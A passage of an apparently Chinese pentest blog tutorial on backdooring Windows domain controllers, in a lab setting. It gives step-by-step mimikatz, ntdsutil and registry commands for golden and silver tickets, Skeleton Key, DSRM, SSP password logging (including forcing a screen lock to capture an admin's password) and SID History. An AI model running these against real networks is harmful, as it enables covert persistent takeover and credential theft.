<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">usemodule persistence/elevated/wmi</span><br><span class="line">set Listener shiyan</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>

<p>后门创建成功，如果目标主机重启，那么他就会在启动时重新上线。</p>
<h2 id="域控制器权限维持常见思路"><a href="#域控制器权限维持常见思路" class="headerlink" title="域控制器权限维持常见思路"></a>域控制器权限维持常见思路</h2><p>在我们拿到域控的控制权后，为了我们对域控制器权限的丢失，需要使用权限维持的方法来维持我们取得的权限。下面我们将介绍几种常用的对域控制器现有权限进行持久化的操作，包括黄金票据、白银票据、Skeleton Key万能密码、DSRM 后门、SSP 注入、SID History 后门、等等。</p>
<h3 id="黄金票据（Golden-ticket）"><a href="#黄金票据（Golden-ticket）" class="headerlink" title="黄金票据（Golden ticket）"></a>黄金票据（Golden ticket）</h3><p>在Windows的kerberos认证过程中，Client将自己的信息发送给KDC，然后KDC使用krbtgt用户的Hash作为密钥进行加密，生成TGT。那么如果获取到了krbtgt的Hash值，不就可以伪造任意的tgt了吗。<strong>因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个后门。</strong></p>
<p>Kerberos认证过程：</p>
<ol>
<li>AS_REQ: Client向KDC发起AS_REQ,请求凭据是Client hash加密的时间戳</li>
<li>AS_REP: KDC使用Client hash进行解密，如果结果正确就返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含Client的sid，Client所在的组</li>
<li>TGS_REQ: Client凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求</li>
<li>TGS_REP: KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据)</li>
<li>AP_REQ: Client拿着TGS票据去请求服务</li>
<li>AP_REP: 服务使用自己的hash解密TGS票据。如果解密正确，就拿着PAC去KDC那边问Client有没有访问权限，域控解密PAC。获取Client的sid，以及所在的组，再根据该服务的ACL，判断Client是否有访问服务的权限。</li>
</ol>
<blockquote>
<p>先假设这么一种情况，原先已拿到的域内所有的账户Hash，包括krbtgt这个账户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置krbtgt密码，基于此条件，我们还能利用该票据重新获得域管理员权限，利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz)，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于Kerberos认证的任何服务。</p>
</blockquote>
<p>攻击者再使用黄金票据进行票据传递攻击时，通常要掌握以下信息：</p>
<ul>
<li>需要伪造的域管理员用户名</li>
<li>完整的域名</li>
<li>域SID</li>
<li>krbtgt的NTLM Hash</li>
</ul>
<p>测试环境如下所示：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021627343.png" alt="image-20231002162744273"></p>
<p>我们已经获得了普通域用户主机Windows7和域控制器DC的控制权，下面我们演示如何用黄金票据建立一个稳固的后门。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">域成员主机：Windows 7（192.168.183.131）</span><br><span class="line">域名：DEMO.com</span><br><span class="line">用户名：douser</span><br><span class="line"></span><br><span class="line">域控制器：192.168.183.130</span><br><span class="line">域名：DEMO.com </span><br><span class="line">用户名：administrator</span><br></pre></td></tr></table></figure>

<p>首先，我们登上域控制器，上传mimikatz，然后执行如下命令抓取krbtgt用户的Hash值并获取域sid：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">lsadump::lsa /patch        // 专用于在域控制器上导出用户密码或hash</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021628046.png" alt="image-20231002162800861"></p>
<p>如上图所示，我们得到krbtgt用户的Hash为：7c4ed692473d4b4344c3ba01c5e6cb63，域sid为S-1-5-21-979886063-1111900045-1414766810</p>
<p>然后，我们切换到普通域用户的机器Windows 7，用mimikatz生成名为ticket.kirbi的TGT凭证，用户名为域管理员用户（administrator）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:DEMO.com /sid:S-1-5-21-979886063-1111900045-1414766810 /krbtgt:7c4ed692473d4b4344c3ba01c5e6cb63 /ticket:ticket.kirbi</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021628610.png" alt="image-20231002162821391"></p>
<p>生成TGT凭证ticket.kirbi成功，名为ticket.kirbi，然后使用mimikatz将凭证ticket.kirbi注入进去：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::purge   //先清空所有票据</span><br><span class="line">kerberos::ptt ticket.kirbi    //再将生成的票据注入域用户主机Windows7中</span><br><span class="line">// kerberos::ptt &lt;票据文件&gt;   </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021628253.png" alt="image-20231002162834188"></p>
<p>此时查看当前会话中的票据，就可以发现刚刚注入的票据在里面了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::tgt</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021628160.png" alt="image-20231002162845006"></p>
<p>到此，注入成功。输入“exit”退出mimikatz，此时，攻击者就可以利用Windows 7任意访问域控制器了，可以使用net use进行登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-ENS2VR5TR3N\c$</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021629540.png" alt="image-20231002162900337"></p>
<p>也可以使用psexec，wmi等方法通过Windows7对DC进行远程执行命令了，具体操作不再演示。</p>
<h3 id="白银票据（Silver-ticket）"><a href="#白银票据（Silver-ticket）" class="headerlink" title="白银票据（Silver ticket）"></a>白银票据（Silver ticket）</h3><p>白银票据不同于黄金票据，白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问该服务的TGT。因为在票据生成过程中不需要使用KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由KDC颁发TGT，并且在生成伪造的TGT得20分钟内，TGS不会对该TGT的真伪进行效验。</p>
<p><strong>白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用krbtgt账号的密码哈希值，因此更加隐蔽。</strong></p>
<p>攻击者要利用白银票据进行票据传递攻击，需要掌握下面几个信息：</p>
<ul>
<li>域名</li>
<li>域SID</li>
<li>目标服务器的FQDN</li>
<li>可利用的服务</li>
<li>服务账号的NTLM Hash</li>
<li>要伪造的用户名</li>
</ul>
<p>如下，我们已经获得了普通域用户主机Windows7和域控制器DC的控制权，将使用白银票据伪造CIFS服务权限，对DC进行持久化控制。CIFS服务通常用于Windows主机之间的文件共享。</p>
<p>测试环境与黄金票据的相同：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021629777.png" alt="image-20231002162915711"></p>
<p>首先，登录域控，抓取机器账号的Hash：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021629447.png" alt="image-20231002162927301"></p>
<p>得到域控制器上的计算机账号的Hash为：f0954d00b21d338aa86051eca90f7f74</p>
<p>（注意是WIN-ENS2VR5TR3N$用户的NTLM-Hash，不是Administrator用户，因为要利用共享服务账号）</p>
<p>然后切换到普通域用户机器Windows 7中，使用mimikatz生成伪造的白银票据：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:DEMO.com /sid:S-1-5-21-979886063-1111900045-1414766810 /target:WIN-ENS2VR5TR3N.DEMO.com /rc4:f0954d00b21d338aa86051eca90f7f74 /service:cifs /user:douser /ptt</span><br></pre></td></tr></table></figure>

<ul>
<li>&#x2F;sid：域的SID值</li>
<li>&#x2F;rc4：server机器的hash</li>
<li>&#x2F;service：可利用的服务，这里是cifs</li>
<li>&#x2F;user：要伪造的用户名，任意填写</li>
<li>&#x2F;target：域控制器名，即FQDN（全称，如dc.domain.com）</li>
</ul>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021629574.png" alt="image-20231002162943354"></p>
<p>成功生成了伪造的白银票据，此时进行权限验证。如下，发现已经可以访问域控制器的共享目录了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\WIN-ENS2VR5TR3N.demo.com\c$         // 机器名要全称，注意是全称</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021630411.png" alt="image-20231002163048215"></p>
<h3 id="Skeleton-Key（万能钥匙）"><a href="#Skeleton-Key（万能钥匙）" class="headerlink" title="Skeleton Key（万能钥匙）"></a>Skeleton Key（万能钥匙）</h3><p>skeleton key(万能钥匙)就是给所有域内用户添加一个相同的密码，域内所有的用户都可以使用这个密码进行认证，同时原始密码也可以使用，其原理就是对 lsass.exe 进行注入，所以重启后会失效。</p>
<p>我们可以使用Skeleton Key(万能密码)，对域内权限进行持久化操作。我们将Skeleton Key安装在域控制器上，便能够能够让所有域用户使用同一个万能密码对域控进行登录，现有的所有域用户使用原密码仍能继续登录，注意并不能更改用户权限，这里需要注意的是重启将失效。具体操作如下。</p>
<p>控制域控制器后，在域控上传mimikatz，并以管理员权限运行，使用mimikatz注入Skeleton Key：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021631949.png" alt="image-20231002163109791"></p>
<p>如上图所示注入成功，此时便会在域内的所有账号中添加万能密码：“mimikatz”，接下来，我们就可以在域内用任何用户，以密码 “mimikatz” 进行登陆了。如下，我们开启域控的远程桌面，并用密码 “mimikatz” 进行登陆：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021632404.png" alt="image-20231002163214300"></p>
<p>如下图，登录成功：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021632636.png" alt="image-20231002163229515"></p>
<p><strong>注意：</strong>微软在2014年3月12日添加了LSA保护策略，用来防止对进程lsass.exe的代码注入，这样一来就无法使用mimikatz对lsass.exe进行注入，相关操作也会失败。所以，我们要绕过LSA Protection，幸运的是，mimikatz早在2013年10月就已支持绕过LSA Protection，但是该功能需要mimidrv.sys文件，导入驱动文件mimidrv.sys后，绕过LSA Protection，即可操作成功。相应的skeleton key安装命令也变为了如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # !+</span><br><span class="line">mimikatz # !processprotect /process:lsass.exe /remove</span><br><span class="line">mimikatz # misc::skeleton</span><br></pre></td></tr></table></figure>

<p>使用系统：</p>
<ul>
<li>Windows 8.1</li>
<li>Windows Server 2012 R2</li>
</ul>
<h3 id="DSRM-后门"><a href="#DSRM-后门" class="headerlink" title="DSRM 后门"></a>DSRM 后门</h3><p>DSRM是Windows域环境中域控制器的安全模式启动选项。每个域控制器都有一个本地管理员账号(也就是DSRM账号)。DSRM的用途是：允许管理员在域环境出现故障或崩溃时还原、修复、重建活动目录数据库，使域环境的运行恢复正常。在域环境创建初期，DSRM的密码需要在安装DC时设置，且很少会被重置。修改DSRM密码最基本的方法是在DC上运行 ntdsutil 命令。</p>
<p>在渗透测试中，可以使用DSRM账号对域环境进行持久化操作。我们知道，每个DC都有本地管理员(administrator)账号和密码（与域管理员账号密码不同）。DSRM账号可以作为每个域控制器的本地管理员用户，通过网络连接域控制器，进而控制域控制器。</p>
<p><strong>注意：该类持久化操作适用的服务器版本：Windows Server 2008及以后版本的Windows服务器。</strong></p>
<p><strong>在域控制器上，DSRM账号的表现形式是本地的管理员 Administrator 用户，也就是说本地管理员 Administrator 用户等于DSRM账号。</strong></p>
<p>假设我们已经获得了域内普通域用户Windows7主机和域控制器DC的控制权，下面我们来简单演示一下如何设置DSRM后门。</p>
<p>1.为DSRM设置新密码</p>
<p>在域控制器的cmd中进入ntdsutil，然后输入下面命令进行修改DSRM账户的密码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil    // 进入ntdsutil</span><br><span class="line">set dsrm password    // 设置DSRM账户的密码</span><br><span class="line">reset password on server null    // 在当前域控制器上恢复DSRM密码</span><br><span class="line">&lt;password&gt;    // 输入新密码</span><br><span class="line">&lt;password&gt;    // 重新输入新密码</span><br><span class="line">q    //退出DSRM密码设置模式</span><br><span class="line">q    // 退出ntdsutil</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021633920.png" alt="image-20231002163312856"></p>
<p>2.接着，我们使用mimikatz来读取本地SAM文件中的本地管理员的NTLM Hash，确认域控制器上DSRM账户的密码是否修改成功：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021633406.png" alt="image-20231002163327316"></p>
<p>如上图所示，本地管理员administrator的NTLM Hash为：d8f69f9520b448174136e49a1051ef07。</p>
<p>3.然后，我们修改目标主机DC的DSRM账户登录方式</p>
<p>在Windows Server 2000以后的版本操作系统中，对DSRM使用控制台登录域控制器进行了限制。我们可以在注册表的HKLM:\System\CurrentControlSet\Control\Lsa\中新建DsrmAdminLogonBehavior项进行设置，将该新建的项中的值设为0、1、2可以分别设置不同的DSRM账户登录方式：</p>
<ul>
<li>0：默认值，只有当域控制器重启并进入DSRM模式时，才可以使用DSRM管理员账号</li>
<li>1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控制器</li>
<li>2：在任何情况下，都可以使用DSRM管理员账号登录域控制器</li>
</ul>
<p>如下所示，我们用命令将DSRM的登录方式设置为“2”，即在任何情况下，都可以使用DSRM管理员账号登录域控制器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ItemProperty &quot;HKLM:\System\CurrentControlSet\Control\Lsa\&quot; -name &quot;DsrmAdminLogonBehavior&quot; -value 2 -propertyType DWORD</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021634460.png" alt="image-20231002163407401"></p>
<p>4.最后，我们即可以在域成员主机Windows7上通过mimikatz，使用域控制器的本地Administrator账号哈希传递攻击域控了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /domain:OWA /user:Administrator /ntlm:d8f69f9520b448174136e49a1051ef07</span><br></pre></td></tr></table></figure>

<p><strong>注意，在这里，&#x2F;domain选项不是添域名，而是域控制器的机器名（OWA），一定要注意。</strong></p>
<p>如下图所示，命令执行完后，会在Windows7上自动打开一个新的cmd窗口，在该窗口中我们不用提供明文密码便可以对域控制器进行远程访问或控制了。如下，我们列出了域控制器的c盘目录：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021634947.png" alt="image-20231002163419870"></p>
<p>除了向上面那样直接修改DSRM账户的密码外，我们还可以为DSRM同步为一个普通域用户的密码。但是要注意，如果域控制器的系统版本为Windows Server 2008，则需要安装 KB961320 补丁才可以使用指定域账号的密码对DSRM的密码进行同步。在Windows Server 2008以后版本的系统中不需要安装此补丁。</p>
<p>同步的方式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil // 进入n</span><br><span class="line">tdsutil set dsrm password // 设置DSRM账户的密码</span><br><span class="line">sync from domain account domainusername  // 使DSRM的密码和指定的domainusername域用户的密码同步</span><br><span class="line">q //退出DSRM密码设置模式    </span><br><span class="line">q // 退出ntdsutil</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021635361.png" alt="image-20231002163521309"></p>
<p>之后的操作就和上面所演示的一样了，同样还是读取本地SAM文件中的本地管理员的NTLM Hash，确认域控制器上DSRM账户的密码是否修改成功，然后同样还是修改目标主机DC的DSRM账户登录方式，最后同样还是在域成员主机Windows7上通过mimikatz，使用域控制器的本地Administrator账号哈希传递攻击域控。</p>
<h3 id="利用-SSP-注入维持权限"><a href="#利用-SSP-注入维持权限" class="headerlink" title="利用 SSP 注入维持权限"></a>利用 SSP 注入维持权限</h3><p>SSP(Security Support Provider)是Windows操作系统<strong>安全机制的提供者</strong>。简单的说，<strong>SSP就是一个DLL文件</strong>，主要用来实现Windows操作系统的<strong>身份认证功能</strong>，例如：NTLM、Kerberos、Negotiate、Secure Channel(Schannel)，Digest、Credential(CredSSP)等等。</p>
<p>SSPI(Security Support Provider Interface)安全支持提供接口，是Windows操作系统在执行认证操作时使用的API接口。也就是说，SSPI是SSP的API接口。</p>
<p>如果我们获得了网络中目标机器的System权限，可以使用该方法进行持久化操作。<strong>其主要原理是：LSA(Local Security Authority)用于身份验证；lsass.exe作为Windows的系统进程，用于本地安全和登录策略；在系统启动时，SSP将被加载到lsass.exe进程中。但是，假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，在系统启动时将其加载到lsass.exe进程中，就能够获取lsass.exe进程中的明文密码。这样，即使用户更改密码并重新登录，攻击者依然可以获取该账号的新密码。</strong></p>
<p>下面我们来演示一下这种权限维持操作。</p>
<h4 id="方法一：用Mimikatz将伪造的SSP直接注入内存"><a href="#方法一：用Mimikatz将伪造的SSP直接注入内存" class="headerlink" title="方法一：用Mimikatz将伪造的SSP直接注入内存"></a>方法一：用Mimikatz将伪造的SSP直接注入内存</h4><p>我们可以使用Mimikatz将伪造的SSP注入内存，就能够获取lsass.exe进程中的明文密码。这样做不会在系统中留下二进制文件，但如果域控重启，被注入的内存的伪造的SSP将会丢失。</p>
<p>在域控中上传mimikatz并以管理员权限运行，输入以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug </span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021635995.png" alt="image-20231002163535764"></p>
<p>如上图所示，我们成功使用Mimikatz将伪造的SSP注入内存，只要用户在目标主机DC上重新登录（这里指的是注销、锁屏等重新登录，重启不行），登录的用户名和密码将会被记录在C:\Windows\System32\mimilsa.log 文件中。</p>
<p>给出一个Windows锁屏的powershell脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Function Lock-WorkStation &#123;</span><br><span class="line"></span><br><span class="line">$signature = @&quot;</span><br><span class="line">[DllImport(&quot;user32.dll&quot;, SetLastError = true)]</span><br><span class="line">public static extern bool LockWorkStation();</span><br><span class="line">&quot;@</span><br><span class="line"></span><br><span class="line">$LockWorkStation = Add-Type -memberDefinition $signature -name &quot;Win32LockWorkStation&quot; -namespace Win32Functions -passthru</span><br><span class="line"></span><br><span class="line">$LockWorkStation::LockWorkStation() | Out-Null</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Lock-WorkStation</span><br></pre></td></tr></table></figure>

<p>将该脚本上传到目标主机后，用powershell运行他即可使目标主机锁屏：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell .\Lock-screen.ps1</span><br><span class="line">powershell 目录\Lock-screen.ps1</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021636217.png" alt="image-20231002163617105"></p>
<p>此时，如果管理员发现屏幕被锁了并重新登录，他的密码就会被记录在 C:\Windows\System32\mimilsa.log 文件中：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021636927.png" alt="image-20231002163630842"></p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021637915.png" alt="image-20231002163705789"></p>
<p>注意：该方法不会再目标主机中留下二进制文件，但是如果域控重启，被注入的内存的伪造的SSP将会丢失。</p>
<h4 id="方法二：直接上传Mimikatz的mimilib-dll"><a href="#方法二：直接上传Mimikatz的mimilib-dll" class="headerlink" title="方法二：直接上传Mimikatz的mimilib.dll"></a>方法二：直接上传Mimikatz的mimilib.dll</h4><p>该方法是直接将mimikatz中的mimilib.dll放到系统的C:\Windows\System32目录下，并将 mimilib.dll 添加到注册表中，使用这种方法，即使系统重启，也不会影响持久化效果，但是会在目标主机上留下二进制文件。</p>
<p>首先，我们上传mimilib.dll到目标域控主机的C:\Windows\System32目录下：</p>
<p>然后修改注册表 HKEY_LOCAL_MACHINE&#x2F;System&#x2F;CurrentControlSet&#x2F;Control&#x2F;Lsa 的 Security Packages 项，将mimilib.dll添加进去，让其加载新的DLL文件“mimilib.dll”：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021637453.png" alt="image-20231002163741375"></p>
<p>这样如果是系统重启后，DLL将会被成功加载，用户在登录时输入的账号密码将会被记录在 C:\Windows\System32\kiwissp.log中：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021637921.png" alt="image-20231002163750809"></p>
<h3 id="SID-History域后门"><a href="#SID-History域后门" class="headerlink" title="SID History域后门"></a>SID History域后门</h3><p><strong>SID</strong>也就是安全标识符（Security Identifiers），是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 SID。Windows 2000 中的内部进程将引用帐户的 SID 而不是帐户的用户或组名。如果创建帐户，再删除帐户，然后使用相同的用户名创建另一个帐户，则新帐户将不具有授权给前一个帐户的权力或权限，原因是该帐户具有不同的 SID 号。安全标识符也被称为安全 ID 或 SID。</p>
<p>在Windows中，每个用户都有自己的SID。SID的作用主要是<strong>跟踪安全主体控制用户连接资源时的访问权限</strong>。</p>
<p><strong>SID History</strong>是在域迁移过程中需要使用的一个属性。</p>
<p>如果将A域中的域用户迁移到B域中，那么在B域中该用户的SID会随之改变，进而影响迁移后用户的权限，导致迁移后的用户不能访问本来可以访问的资源。SID History的作用是在域迁移过程中保持域用户的访问权限，即<strong>如果迁移后用户的SID改变了，系统会将其原来的SID添加到迁移后用户的SID History属性中，使迁移后的用户保持原有权限、能够访问其原来可以访问的资源</strong>。使用mimikatz，可以将SID History属性添加到域中任意用户的SID History属性中。在实战中，如果获得了域管理员权限，则可以将SID History作为实现持久化的方法。</p>
<p>下面我们演示用mimikatz添加SID History后门的操作。</p>
<p>首先我们在域控制器上新建一个恶意用户“whoami”：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user whoami Liufupeng123 /add</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021638962.png" alt="image-20231002163835861"></p>
<p>然后再域控上传mimikatz，并用管理员权限运行。然后执行如下命令，将域管理员Administrator的SID添加到恶意域用户 whoami 的SID History属性中。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sid::patch</span><br><span class="line">sid::add /sam:whoami /new:Administrator   //将Administrator的SID添加到whoami的SID History属性中</span><br></pre></td></tr></table></figure>

<p>注意：在使用mimikatz注入SID之前，需要使用 sid::patch 命令修复NTDS服务，否则无法将高权限的SID注入低权限用户的SID History属性；mimikatz在2.1版本后，将 misc:addsid 模块添加到了 sid:add 模块下。</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021638565.png" alt="image-20231002163846391"></p>
<p>然后，我们可以用powershell查看一下这个whoami恶意用户的SID History：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021639556.png" alt="image-20231002163903479"></p>
<p>如上图所示，whoami用户的SID History和administrator域管理员的sid相同。那么现在，我们的whoami用户便拥有了administrator域管理员的权限，并可以用该用户登录域控主机：</p>
<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021639328.png" alt="image-20231002163917209"></p>
<p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/252963.html">https://www.freebuf.com/articles/web/252963.html</a></p>

    </div>

    
        <hr class="fhr">
        <div id="vcomments"></div>
    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2020 <a class="flink" target="_blank" rel="noopener" href="https://hexo.io">Hexo</a>-<a class="flink" target="_blank" rel="noopener" href="https://github.com/sanjinhub/hexo-theme-geek">Geek</a>.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
        </label>
<!--         <script type="text/javascript">
        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
        </script> -->
    </p>
</div>
<input type="hidden" id="web_style" value="black">
<input type="hidden" id="valine_appid" value="CmCti21ooOOIzFOhEyFkFvR0-gzGzoHsz">
<input type="hidden" id="valine_appKey" value="FqiyUqbg7McKN2eG0MCewupf">

<script src="/project/libs/jquery.min.js"></script>


<script src="/project/libs/highlight/highlight.pack.js"></script>

<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>

<script src="/project/js/js.js"></script>

<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>